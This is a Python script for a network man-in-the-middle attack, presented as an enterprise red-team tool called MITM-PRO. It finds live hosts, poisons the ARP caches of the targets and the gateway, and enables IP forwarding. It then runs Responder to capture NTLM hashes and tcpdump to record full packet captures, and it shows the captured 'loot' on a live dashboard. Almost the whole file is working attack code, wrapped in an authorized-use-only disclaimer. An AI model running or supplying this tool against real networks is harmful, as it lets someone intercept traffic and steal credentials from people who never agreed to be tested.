#!/usr/bin/env python3
# =====================================================
# MITM-PRO v4.1-ULTIMATE - Enterprise Red Team / Pentest
# Authorized Internal Exercise ONLY - 2026
# Author: Đoàn Khánh
# =====================================================

import argparse
import logging
import os
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.layout import Layout
from rich import box
from rich.prompt import Confirm

try:
    from scapy.all import *
except ImportError:
    print("❌ pip3 install scapy rich")
    sys.exit(1)

console = Console()
STOP_EVENT = threading.Event()
mac_cache = {}

class Config:
    VERSION = "4.1-ULTIMATE"
    LOG_FILE = Path("mitm_pro.log")
    OUTPUT_DIR = Path("mitm_pro_loot")
    RES_LOG = None
    PCAP_FILE = None
    MAX_TARGETS = 25
    ARP_INTERVAL = {"safe": 2.8, "normal": 1.6, "aggressive": 0.9}

    @staticmethod
    def setup_logging():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=[
                logging.FileHandler(Config.LOG_FILE, encoding="utf-8"),
                logging.StreamHandler(sys.stdout)
            ]
        )

    @staticmethod
    def set_output_dir(directory: str):
        Config.OUTPUT_DIR = Path(directory)
        Config.OUTPUT_DIR.mkdir(exist_ok=True, parents=True)
        Config.RES_LOG = Config.OUTPUT_DIR / "responder.log"
        Config.PCAP_FILE = Config.OUTPUT_DIR / "capture.pcap"

class State:
    iface = None
    gw = None
    gw_mac = None
    targets = []
    targets_lock = threading.Lock()
    responder_proc = None
    tcpdump_proc = None
    poison_thread = None
    start_time = None
    mode = "safe"
    orig_ip_forward = None

state = State()

def get_mac(ip: str):
    """Lấy MAC address chính xác (cache để nhanh). Trả về None nếu không tìm được."""
    if ip in mac_cache:
        return mac_cache[ip]
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, iface=state.iface, verbose=0)
        if ans:
            mac = ans[0][1].hwsrc
            mac_cache[ip] = mac
            return mac
    except Exception:
        pass
    return None

def scan_live_hosts(cidr: str):
    logging.info(f"🔍 Scanning live hosts in {cidr}...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr), 
                 timeout=5, iface=state.iface, verbose=0)
    hosts = [pkt[1].psrc for pkt in ans if pkt[1].psrc != state.gw]
    if len(hosts) > Config.MAX_TARGETS:
        hosts = hosts[:Config.MAX_TARGETS]
        logging.warning(f"⚠️ Limited to {Config.MAX_TARGETS} targets (safety)")
    return hosts

def show_banner():
    console.print(Panel(
        f"[bold red]MITM-PRO v{Config.VERSION}[/]\n"
        "[cyan]Enterprise Red Team / Pentest Edition[/]\n"
        "[green]Author: Đoàn Khánh[/]\n"
        "[yellow]AUTHORIZED INTERNAL EXERCISE ONLY[/yellow]",
        title="⚠️ LEGAL DISCLAIMER - DO NOT USE WITHOUT WRITTEN PERMISSION",
        style="bold red"
    ))

class ArpPoisoner(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.interval = Config.ARP_INTERVAL.get(state.mode, 1.6)

    def run(self):
        logging.info(f"🔴 Starting STEALTH ARP Poisoning ({state.mode} mode)")
        state.gw_mac = get_mac(state.gw)
        if state.gw_mac is None:
            logging.error("❌ Cannot resolve gateway MAC — aborting poisoner")
            return
        with state.targets_lock:
            for target in state.targets:
                get_mac(target)  # pre-cache

        attacker_mac = get_if_hwaddr(state.iface)
        while not STOP_EVENT.is_set():
            with state.targets_lock:
                targets_snapshot = list(state.targets)
            for target in targets_snapshot:
                if target == state.gw:
                    continue
                target_mac = get_mac(target)
                if target_mac is None:
                    logging.warning(f"⚠️ Cannot resolve MAC for {target}, skipping")
                    continue

                # 1. Tell Target: "Gateway MAC = Attacker"
                send(ARP(op=2, pdst=target, psrc=state.gw, hwdst=target_mac, hwsrc=attacker_mac),
                     iface=state.iface, verbose=0)

                # 2. Tell Gateway: "Target MAC = Attacker"
                send(ARP(op=2, pdst=state.gw, psrc=target, hwdst=state.gw_mac, hwsrc=attacker_mac),
                     iface=state.iface, verbose=0)
            time.sleep(self.interval)

    def stop(self):
        logging.info("🛑 Restoring ARP tables...")
        gw_mac = state.gw_mac or get_mac(state.gw)
        if gw_mac is None:
            logging.warning("⚠️ Cannot restore ARP — gateway MAC unknown")
            return
        with state.targets_lock:
            targets_snapshot = list(state.targets)
        for target in targets_snapshot:
            target_mac = get_mac(target)
            if target_mac is None:
                logging.warning(f"⚠️ Cannot restore ARP for {target} — MAC unknown")
                continue
            # Restore target: tell it the gateway's real MAC
            send(ARP(op=2, pdst=target, psrc=state.gw, hwdst=target_mac, hwsrc=gw_mac),
                 count=6, iface=state.iface, verbose=0)
            # Restore gateway: tell it the target's real MAC
            send(ARP(op=2, pdst=state.gw, psrc=target, hwdst=gw_mac, hwsrc=target_mac),
                 count=6, iface=state.iface, verbose=0)

def start_services():
    logging.info("🐸 Starting Responder...")
    state.responder_proc = subprocess.Popen(
        ["responder", "-I", state.iface, "-wrf", "--lm", "-v"],
        stdout=open(Config.RES_LOG, "w"), stderr=subprocess.STDOUT
    )
    logging.info("📡 Starting PCAP...")
    state.tcpdump_proc = subprocess.Popen(
        ["tcpdump", "-i", state.iface, "-w", str(Config.PCAP_FILE), "-U", "-q"]
    )
    state.poison_thread = ArpPoisoner()
    state.poison_thread.start()

def make_dashboard():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=5),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=12)
    )

    uptime = str(datetime.utcfromtimestamp(time.time() - state.start_time)).split('.')[0]

    # Header
    header = Table.grid(expand=True)
    header.add_row(f"MITM-PRO v{Config.VERSION}", f"Uptime: {uptime} | Mode: [red]{state.mode.upper()}[/]")
    header.add_row(f"Interface: [cyan]{state.iface}[/]", f"Targets: [yellow]{len(state.targets)}[/]")
    layout["header"].update(Panel(header, title="SESSION", border_style="green"))

    # Targets Table
    table = Table(title="🧬 LIVE ARP POISON STATUS", box=box.ROUNDED)
    table.add_column("Target IP", style="cyan")
    table.add_column("MAC", style="magenta")
    table.add_column("Status", style="green")
    with state.targets_lock:
        targets_view = list(state.targets[:15])
    for target in targets_view:
        mac = mac_cache.get(target)
        if mac:
            mac_display = mac[:17]
            status = "✅ POISONED"
        else:
            mac_display = "—"
            status = "⏳ Resolving"
        table.add_row(target, mac_display, status)
    layout["main"].update(Panel(table))

    # Loot Footer
    hashes = 0
    recent = []
    if Config.RES_LOG.exists():
        try:
            lines = Path(Config.RES_LOG).read_text(encoding="utf-8", errors="ignore").splitlines()[-10:]
            recent = [line.strip() for line in lines if any(x in line for x in ["NTLM", "SMB", "HTTP"])]
            hashes = len([l for l in lines if "NTLM" in l])
        except:
            pass
    pcap_mb = os.path.getsize(Config.PCAP_FILE) / (1024 * 1024) if Config.PCAP_FILE.exists() else 0

    footer_text = f"🔥 Hashes: [red]{hashes}[/] | PCAP: [cyan]{pcap_mb:.1f} MB[/]\n\n" + "\n".join(recent[:6])
    layout["footer"].update(Panel(footer_text, title="🐸 REAL-TIME LOOT", border_style="red"))

    return layout

def generate_report():
    try:
        ntlm_count = 0
        if Config.RES_LOG and Config.RES_LOG.exists():
            ntlm_count = sum(
                1 for line in Config.RES_LOG.open(errors="ignore") if "NTLM" in line
            )
        report = Config.OUTPUT_DIR / f"PENTEST_REPORT_{datetime.now().strftime('%Y%m%d_%H%M')}.html"
        with open(report, "w", encoding="utf-8") as f:
            f.write(f"""<html><head><title>MITM-PRO Enterprise Report</title></head><body>
        <h1>MITM-PRO v4.1-ULTIMATE Report</h1>
        <p><b>Date:</b> {datetime.now()}</p>
        <p><b>Targets poisoned:</b> {len(state.targets)}</p>
        <p><b>NTLM Hashes captured:</b> {ntlm_count}</p>
        <p><b>PCAP:</b> {Config.PCAP_FILE}</p>
        <p><b>Log:</b> {Config.LOG_FILE}</p>
        </body></html>""")
        logging.info(f"📄 Report saved: {report}")
    except Exception as e:
        logging.error(f"❌ Report generation failed: {e}")

def cleanup():
    STOP_EVENT.set()
    if state.poison_thread:
        state.poison_thread.stop()
    if state.responder_proc:
        state.responder_proc.terminate()
    if state.tcpdump_proc:
        state.tcpdump_proc.terminate()
    if state.orig_ip_forward is not None:
        subprocess.run(
            ["sysctl", "-w", f"net.ipv4.ip_forward={state.orig_ip_forward}"],
            capture_output=True
        )
        logging.info(f"🔁 Restored net.ipv4.ip_forward={state.orig_ip_forward}")
    generate_report()
    logging.info("✅ MITM-PRO ENTERPRISE SESSION CLEANED UP SUCCESSFULLY")

def main():
    Config.setup_logging()
    show_banner()

    if sys.platform != "linux":
        logging.error("❌ MITM-PRO requires Linux!")
        sys.exit(1)

    if os.geteuid() != 0:
        logging.error("❌ Run with sudo!")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="MITM-PRO v4.1-ULTIMATE - Enterprise Red Team")
    parser.add_argument("-i", "--interface", help="Interface")
    parser.add_argument("-g", "--gateway", help="Gateway IP (route muốn giả mạo)")
    parser.add_argument("-R", "--range", help="CIDR range")
    parser.add_argument("-T", "--targets", help="Comma-separated targets")
    parser.add_argument("-o", "--outdir", default=str(Config.OUTPUT_DIR))
    parser.add_argument("--mode", choices=["safe", "normal", "aggressive"], default="safe")
    parser.add_argument("--max-targets", type=int, default=Config.MAX_TARGETS)
    parser.add_argument("--report", action="store_true", default=True)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    Config.set_output_dir(args.outdir)
    state.mode = args.mode

    if args.gateway and (args.range or args.targets):
        state.iface = args.interface or "eth0"
        state.gw = args.gateway
        if args.range:
            state.targets = scan_live_hosts(args.range)
        else:
            state.targets = [t.strip() for t in args.targets.split(",") if t.strip()]
    else:
        # Interactive nếu thiếu
        state.iface = console.input("🌐 Interface: ") or "eth0"
        state.gw = console.input("🔴 Gateway IP: ")
        choice = console.input("🎯 1=List IP | 2=CIDR: ")
        if choice == "1":
            state.targets = [t.strip() for t in console.input("IPs (comma): ").split(",") if t.strip()]
        else:
            cidr = console.input("CIDR: ")
            state.targets = scan_live_hosts(cidr)

    if not state.targets:
        logging.error("❌ No targets!")
        sys.exit(1)

    if args.dry_run:
        logging.info("🧪 DRY-RUN MODE - No attack performed")
        return

    if not Confirm.ask(f"[bold red]🚀 START ATTACK with {len(state.targets)} targets?[/]", default=False):
        logging.info("User cancelled")
        sys.exit(0)

    _orig = subprocess.run(["sysctl", "-n", "net.ipv4.ip_forward"], capture_output=True, text=True)
    state.orig_ip_forward = _orig.stdout.strip() or "0"
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    state.start_time = time.time()
    start_services()

    with Live(make_dashboard(), refresh_per_second=1.5, screen=True) as live:
        try:
            while not STOP_EVENT.is_set():
                live.update(make_dashboard())
                time.sleep(1.5)
        except KeyboardInterrupt:
            pass

    cleanup()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: STOP_EVENT.set())
    main()